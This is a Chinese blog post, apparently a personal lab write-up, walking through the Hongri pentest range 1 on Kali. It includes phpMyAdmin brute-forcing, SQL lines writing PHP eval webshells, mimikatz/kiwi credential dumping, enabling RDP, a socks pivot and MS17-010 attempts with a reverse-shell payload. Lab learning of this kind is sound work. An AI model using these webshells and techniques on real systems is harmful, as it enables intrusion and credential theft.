@@ -1,0 +1,520 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"c4ooc0.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.13.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="详细教程这个博客里已经写的很清楚了，下面只记录一些我的收获和过程 踩了不少坑，仍有未解决的东西，记录我的过程应该也有点参考价值吧  一、环境搭建  1.环境搭建测试 [WEB 安全]红日靶场（一）环境搭建 有一点小误区，物理机访问 web 时，应用 NAT 的地址 搭建完成后记得测试内网三台机子之间的连通性（之前正常，后来 ping 不通，可以尝试重启）  2.信息收集   活动主机  Netdi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日靶场1 kali2022.2">
+<meta property="og:url" content="https://c4ooc0.github.io/2022/07/14/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1%20kali2022.2/index.html">
+<meta property="og:site_name" content="c4ooc0个人博客">
+<meta property="og:description" content="详细教程这个博客里已经写的很清楚了，下面只记录一些我的收获和过程 踩了不少坑，仍有未解决的东西，记录我的过程应该也有点参考价值吧  一、环境搭建  1.环境搭建测试 [WEB 安全]红日靶场（一）环境搭建 有一点小误区，物理机访问 web 时，应用 NAT 的地址 搭建完成后记得测试内网三台机子之间的连通性（之前正常，后来 ping 不通，可以尝试重启）  2.信息收集   活动主机  Netdi">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FnDi9PS3wjj_6kR0NE2gm1Vx61T-.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fg5gThsZ6nRpYRW1UolP3AUEWsWB.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FkHI7p8vaVPcYWA9YnwH2nkXyp4v.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FhoqzldCNUX5xa0S4Zjj9MiLBTLr.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FmxO3jAYxTWltVCizaNpwMzXJzmt.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FrU_T_WPFwqJAoy_sRZziQAtvlaH.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FlrEdshhOTUXenDEO5UQckIsNY3z.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FujZjE9ZS4iPbx_tLvbEQDNvgmnM.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fl5RLbVz3odaF-8AHwxEtbHb0O5O.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FldZgayT5Huf-5cUylpBVnNrqToI.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FgXc88I_WmDzvYkuDxFRx3KzOi3w.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fq7PG-EIinD4dPXtnKcETxuviYel.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FktBHjOewG9RHv0TMlSREeq0VRDU.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FiHTuruX5AakcAwGozymd4OvqoTz.png">
+<meta property="article:published_time" content="2022-07-14T01:06:52.000Z">
+<meta property="article:modified_time" content="2022-11-10T08:11:19.494Z">
+<meta property="article:author" content="c4ooc0">
+<meta property="article:tag" content="安全 瞎折腾">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FnDi9PS3wjj_6kR0NE2gm1Vx61T-.png">
+
+
+<link rel="canonical" href="https://c4ooc0.github.io/2022/07/14/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1%20kali2022.2/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://c4ooc0.github.io/2022/07/14/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1%20kali2022.2/","path":"2022/07/14/红日靶场1 kali2022.2/","title":"红日靶场1 kali2022.2"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>红日靶场1 kali2022.2 | c4ooc0个人博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">c4ooc0个人博客</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">半吊子的安全工程师，ACG爱好者</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text"> 一、环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%B5%8B%E8%AF%95"><span class="nav-number">1.1.</span> <span class="nav-text"> 1.环境搭建测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.2.</span> <span class="nav-text"> 2.信息收集</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text"> 二、漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3%E6%BC%8F%E6%B4%9E%E6%90%9C%E7%B4%A2%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="nav-number">2.1.</span> <span class="nav-text"> 3.漏洞搜索与利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4%E5%90%8E%E5%8F%B0-getshell-%E4%B8%8A%E4%BC%A0%E6%8A%80%E5%B7%A7"><span class="nav-number">2.2.</span> <span class="nav-text"> 4.后台 Getshell 上传技巧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.3.</span> <span class="nav-text"> 5.系统信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6%E4%B8%BB%E6%9C%BA%E5%AF%86%E7%A0%81%E6%94%B6%E9%9B%86"><span class="nav-number">2.4.</span> <span class="nav-text"> 6.主机密码收集</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89-%E5%86%85%E7%BD%91%E6%90%9C%E9%9B%86"><span class="nav-number">3.</span> <span class="nav-text"> 三、内网搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#7%E5%86%85%E7%BD%91%E7%BB%A7%E7%BB%AD%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">3.1.</span> <span class="nav-text"> 7.内网–继续信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#msf-socks4a-proxychains-%E7%A9%BF%E9%80%8F%E5%86%85%E7%BD%91"><span class="nav-number">3.1.1.</span> <span class="nav-text"> msf socks4a proxychains 穿透内网</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8%E5%86%85%E7%BD%91%E6%94%BB%E5%87%BB%E5%A7%BF%E5%8A%BF%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="nav-number">3.2.</span> <span class="nav-text"> 8.内网攻击姿势–信息泄露</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">3.3.</span> <span class="nav-text"> </span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">c4ooc0</p>
+  <div class="site-description" itemprop="description">永怀谦卑与求知欲</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/c4ooc0" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;c4ooc0" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.yuque.com/choocolate-yqwd/blog" title="语雀 → https:&#x2F;&#x2F;www.yuque.com&#x2F;choocolate-yqwd&#x2F;blog" rel="noopener" target="_blank">语雀</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll site-overview-item animated">
+    <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+      友友们
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://macshuo.com/" title="http:&#x2F;&#x2F;macshuo.com&#x2F;" rel="noopener" target="_blank">testLink</a>
+        </li>
+    </ul>
+  </div>
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://c4ooc0.github.io/2022/07/14/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA1%20kali2022.2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="c4ooc0">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="c4ooc0个人博客">
+      <meta itemprop="description" content="永怀谦卑与求知欲">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="红日靶场1 kali2022.2 | c4ooc0个人博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          红日靶场1 kali2022.2
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-07-14 09:06:52" itemprop="dateCreated datePublished" datetime="2022-07-14T09:06:52+08:00">2022-07-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-11-10 16:11:19" itemprop="dateModified" datetime="2022-11-10T16:11:19+08:00">2022-11-10</time>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2.3k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>8 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>详细教程<a target="_blank" rel="noopener" href="https://blog.csdn.net/YouthBelief/article/details/120974079">这个博客</a>里已经写的很清楚了，下面只记录一些我的收获和过程
+踩了不少坑，仍有未解决的东西，记录我的过程应该也有点参考价值吧</p>
+<h1 id="一-环境搭建"><a class="markdownIt-Anchor" href="#一-环境搭建"></a> 一、环境搭建</h1>
+<h2 id="1环境搭建测试"><a class="markdownIt-Anchor" href="#1环境搭建测试"></a> 1.环境搭建测试</h2>
+<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_15302226/5189485">[WEB 安全]红日靶场（一）环境搭建</a>
+有一点小误区，物理机访问 web 时，应用 NAT 的地址
+搭建完成后记得测试内网三台机子之间的连通性（之前正常，后来 ping 不通，可以尝试重启）</p>
+<h2 id="2信息收集"><a class="markdownIt-Anchor" href="#2信息收集"></a> 2.信息收集</h2>
+<p><img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FnDi9PS3wjj_6kR0NE2gm1Vx61T-.png" alt="" /></p>
+<ul>
+<li>活动主机</li>
+</ul>
+<p>Netdiscover 是一种网络扫描工具，通过 ARP 扫描发现活动主机，可以通过主动和被动两种模式进行 ARP 扫描。通过主动发送 ARP 请求检查网络 ARP 流量，通过自动扫描模式扫描网络地址。
+<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hiyong/p/14590209.html">Netdiscover 使用</a></p>
+<ul>
+<li>端口扫描
+<ul>
+<li>Masscan</li>
+</ul>
+</li>
+</ul>
+<p>masscan 的扫描结果类似于 nmap(一个很著名的端口扫描器)，在内部，它更像 scanrand, unicornscan, and ZMap，采用了异步传输的方式。它和这些扫描器最主要的区别是，它比这些扫描器更快。而且，masscan 更加灵活，它允许自定义任意的地址范和端口范围。
+<a target="_blank" rel="noopener" href="https://blog.csdn.net/nex1less/article/details/108195321">Masscan 使用</a></p>
+<ul>
+<li>nmap</li>
+</ul>
+<p>（nmap 能扫出来的东西好多
+<a target="_blank" rel="noopener" href="https://blog.csdn.net/smli_ng/article/details/105964486">nmap 详细用法</a></p>
+<h1 id="二-漏洞利用"><a class="markdownIt-Anchor" href="#二-漏洞利用"></a> 二、漏洞利用</h1>
+<h2 id="3漏洞搜索与利用"><a class="markdownIt-Anchor" href="#3漏洞搜索与利用"></a> 3.漏洞搜索与利用</h2>
+<p>nmap 确定服务
+<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fg5gThsZ6nRpYRW1UolP3AUEWsWB.png" alt="" />
+御剑目录扫描，主要依赖字典强度，御剑内置了几个字典可以拿来直接用
+<a target="_blank" rel="noopener" href="https://github.com/rootphantomer/Blasting_dictionary">目录爆破字典-github</a>
+<a target="_blank" rel="noopener" href="https://github.com/foryujian/yjdirscan">github 御剑</a>
+<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FkHI7p8vaVPcYWA9YnwH2nkXyp4v.png" alt="" />
+然后看到 phpmyadmin，爆破用户名密码，登上去</p>
+<h2 id="4后台-getshell-上传技巧"><a class="markdownIt-Anchor" href="#4后台-getshell-上传技巧"></a> 4.后台 Getshell 上传技巧</h2>
+<p>上传 webshell 有两个难点</p>
+<ol>
+<li>上传 shell</li>
+<li>知道 shell 上传的路径</li>
+</ol>
+<p>通过 sql，博客提到了两种方法：</p>
+<ul>
+<li>通过写入文件</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://192.168.143.131/phpmyadmin/url.php?url=http%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.5%2Fen%2Fshow.html&amp;token=ec216890e220ba8ba9bda74b2167b9c7">SHOW</a> <strong>GLOBAL</strong> <strong>VARIABLES</strong> <a target="_blank" rel="noopener" href="http://192.168.143.131/phpmyadmin/url.php?url=http%3A%2F%2Fdev.mysql.com%2Fdoc%2Frefman%2F5.5%2Fen%2Fstring-comparison-functions.html%23operator_like&amp;token=ec216890e220ba8ba9bda74b2167b9c7">LIKE</a> '%secure%'
+博客里说“为 NULL 不可写入文件，要想修改 Value 值 只能通过配置文件 mysql.ini 修改”，然后我尝试修改 secure_auth，成功
+<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FhoqzldCNUX5xa0S4Zjj9MiLBTLr.png" alt="" />
+但是修改 secure_file_priv 失败，此路确实不通
+<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FmxO3jAYxTWltVCizaNpwMzXJzmt.png" alt="" />
+记录一下通过文件方式上传 shell 的方法</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select 1,&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27; INTO OUTFILE &#x27;/var/www/html/test.php&#x27;#</span><br><span class="line"></span><br><span class="line">select 1,&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27; INTO dumpfile &#x27;/var/www/html/test.php&#x27;#</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">区别在于使用outfile时,文件中一行的末尾会自动换行</span></span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>通过全局日志文件</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FrU_T_WPFwqJAoy_sRZziQAtvlaH.png" alt="" />
+需要先开启日志功能，根据查询结果可以看到日志路径，但不是可以通过网址访问的路径，于是需要改日志文件的位置，通过 sql 结果可以看到 phpstudy 的路径，直接可以锁定：'C:/phpStudy1/WWW/3.php'，通过 sql 语句<code>SELECT '&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;'</code>上传成功，蚁剑连接</p>
+<ol start="3">
+<li>使用慢查询日志 getsehll</li>
+</ol>
+<p>这个<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41821603/article/details/109948920">博客</a>使用了慢日志 getshell
+步骤：</p>
+<ul>
+<li>开启慢日志</li>
+<li>指定慢日志存放位置</li>
+<li></li>
+</ul>
+<ol start="4">
+<li>
+<p>使用错误日志 getshell</p>
+</li>
+<li>
+<p>利用 phpmyadmin4.8.x 本地文件包含漏洞 getshell</p>
+</li>
+</ol>
+<h2 id="5系统信息收集"><a class="markdownIt-Anchor" href="#5系统信息收集"></a> 5.系统信息收集</h2>
+<ol>
+<li>是否存在域</li>
+</ol>
+<p>判断方法</p>
+<ul>
+<li>whoami hostname 对比</li>
+<li>ipconfig /all 看 DNS</li>
+<li>systeminfo 看是否有域一栏</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45290991/article/details/118539048">这个博客</a>写收集信息更清晰一些，后面的密码收集也写的不错</p>
+<ol start="2">
+<li>网络连接情况 进程 杀软 服务 是否可以出网 用户开放情况</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ipconfig 看所处网段是否有多个</span><br><span class="line">netstat -ano 查看网络连接和开放端口</span><br><span class="line">net start  查看启动的服务  用于提权</span><br><span class="line">tasklist   查看开启的进程</span><br><span class="line">tasklist /SVC 复制到在线杀软识别 看存在的杀软情况  https://i.hacking8.com/tiquan</span><br><span class="line">ping baidu  看是否可以出网等</span><br><span class="line">net user   存在用户</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>翻看 txt 文件</li>
+</ol>
+<p>有些博客中还提到 CS，CS 是 Cobalt Strike 的简称，是一款渗透测试神器，常被业界人称为 CS 神器。Cobalt Strike 已经不再使用 MSF 而是作为单独的平台使用，它分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。
+<a target="_blank" rel="noopener" href="https://blog.csdn.net/zzwwhhpp/article/details/111773395">CS 安装与用法</a>，到官网看了一下，发现需要花钱，然后搜着搜着看到 cs 的免费版本 Armitage，应该是 kali 有自带的，然后发现我的 kali 没有</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/BuNahua/article/details/120037331">在红日靶场 1 中的实例</a></p>
+<h2 id="6主机密码收集"><a class="markdownIt-Anchor" href="#6主机密码收集"></a> 6.主机密码收集</h2>
+<p>先提权，然后 load kiwi 获得主机密码</p>
+<p>遇到问题：
+这里运行<code>run hashdump</code>时出现错误：Error: ArgumentError wrong number of arguments (given 4, expected 5) ，暂未找到解决方法。看<a target="_blank" rel="noopener" href="https://blog.hz2016.com/2022/05/%e3%80%90cfs%e3%80%91%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba%e4%b8%80/">这里</a>说报错是由于 kali 的内核版本问题，我用的是当前（2022.5）kali 的最新版本，前面贴出的博客也提到换了旧版就可以执行，这里就不试了。
+使用 kiwi 模块时，运行<code>creds_all</code>出错：ActiveRecord（翻译：错误运行命令 creds_all: ActiveRecord::RecordInvalid 验证失败:数据不是&lt;lan manager 十六进制 hash=&quot;&quot;&gt;:&lt;nt lan=&quot;&quot; manager 十六进制摘要=&quot;&quot;&gt;的 NTLMHash 数据格式，其中每个十六进制摘要是 32 个小写的十六进制字符。</nt></lan>）</p>
+<p>kiwi
+<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46258964/article/details/125210258">内网渗透 Windows 密码凭证获取</a> 只需要看 msf 部分，写的挺清楚的
+migrate x64 的进程号后，加载 mimikatz 模块有警告:&quot;The &quot;mimikatz&quot; extension has been replaced by &quot;kiwi&quot;.&quot;，对应<code>mimikatz_command -f sekurlsa::searchPasswords</code>现在需要写成<code>kiwi_cmd sekurlsa::logonpasswords</code>（命令错了会提示合法参数，可以说很贴心了）
+<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FlrEdshhOTUXenDEO5UQckIsNY3z.png" alt="" /></p>
+<p>为什么要用 nmap 扫 3389 端口？
+3389 是远程桌面服务端口，<code>run post/windows/manage/enable_rdp</code>开启这个端口
+<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FujZjE9ZS4iPbx_tLvbEQDNvgmnM.png" alt="" />
+果然登进来了（先做了下一步内网穿透，不知道有没有关系）</p>
+<h1 id="三-内网搜集"><a class="markdownIt-Anchor" href="#三-内网搜集"></a> 三、内网搜集</h1>
+<h2 id="7内网继续信息收集"><a class="markdownIt-Anchor" href="#7内网继续信息收集"></a> 7.内网–继续信息收集</h2>
+<h3 id="msf-socks4a-proxychains-穿透内网"><a class="markdownIt-Anchor" href="#msf-socks4a-proxychains-穿透内网"></a> msf socks4a proxychains 穿透内网</h3>
+<p>这里的思路是先建立攻击机到内网的路由，然后再加一个 sock 代理，使得其他应用也可以访问内网，就可以进一步收集内网信息。
+内网信息收集可以参考这个，<a target="_blank" rel="noopener" href="https://blog.csdn.net/YouthBelief/article/details/120974079">红日靶场 1 实战经验</a></p>
+<p>问题：
+原博客中<code>use auxiliary/server/socks4a </code>找不到了，用了<code>auxiliary/server/socks_proxy</code>代替，可以参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/u014029795/article/details/117375754">msf 及 socks 代理转发</a>
+<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fl5RLbVz3odaF-8AHwxEtbHb0O5O.png" alt="" />（可爱）
+kali 最新版好像没有 proxychains ，使用 apt-get 安装
+然后我发现，<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FldZgayT5Huf-5cUylpBVnNrqToI.png" alt="" />
+另开一个窗口，访问内网主机不加 proxychain 反而有用？？
+<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FgXc88I_WmDzvYkuDxFRx3KzOi3w.png" alt="" />
+可能这个 auxiliary/server/socks_proxy 变成全局代理了</p>
+<h2 id="8内网攻击姿势信息泄露"><a class="markdownIt-Anchor" href="#8内网攻击姿势信息泄露"></a> 8.内网攻击姿势–信息泄露</h2>
+<p><img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/Fq7PG-EIinD4dPXtnKcETxuviYel.png" alt="" />
+跟着博客扫了永恒之蓝，发现存活的主机 win2003（141），xin2008（138）
+使用 发现 Exploit completed, but no session was created
+多次重复，发现了更多报错，看网上说是重启靶机，使用 vmware 发现依旧不能成功</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ElsonHY/article/details/109939420">MS17-010（Eternal blue 永恒之蓝）</a>
+<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_29277155/article/details/96865836">计算机病毒命名规则</a> <a target="_blank" rel="noopener" href="https://blog.csdn.net/gwruiki/article/details/123807368">漏洞命名规则</a> ms 是微软漏洞库编号，格式：MS 年-编号
+尝试利用 ms17-010 反弹 shell</p>
+<p>这里渗透失败了，是因为目标机是 32 位系统，而 MSF 内置的漏洞是 64 位的，需要安装 32 位的漏洞，可以参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41617034/article/details/91051614">利用 MS17-010 渗透 win7（32 位）</a>（防火墙拦着我不让我从浏览器下，找了个梯子，挂全局代理，git clone 才下下来）
+遇到了一个博主没遇到的问题：</p>
+<blockquote>
+<p><code>Error sending wrong architecture DLL to target</code></p>
+</blockquote>
+<p>是 payload 设错了，参考<a target="_blank" rel="noopener" href="https://github.com/Telefonica/Eternalblue-Doublepulsar-Metasploit/issues/17">https://github.com/Telefonica/Eternalblue-Doublepulsar-Metasploit/issues/17</a>，<code>set payload windows/meterpreter/reverse_tcp</code>
+<img src="https://cdn.jsdelivr.net/gh/c4ooc0/blog-image/blog/images/FktBHjOewG9RHv0TMlSREeq0VRDU.png" alt="" />
+然后做到这一步，试了好多次都没成功（第二天重新搭环境来了一次，也没出来）
+看了原博客中使用的模块介绍，141 是 window2003，不在 target 之内，人傻了
+换 payload 试了 138，报“00a0:err:rpc:I_RpcReceive we got fault packet with status 0x1c010003
+”，查了半天也没看出来怎么解决。。
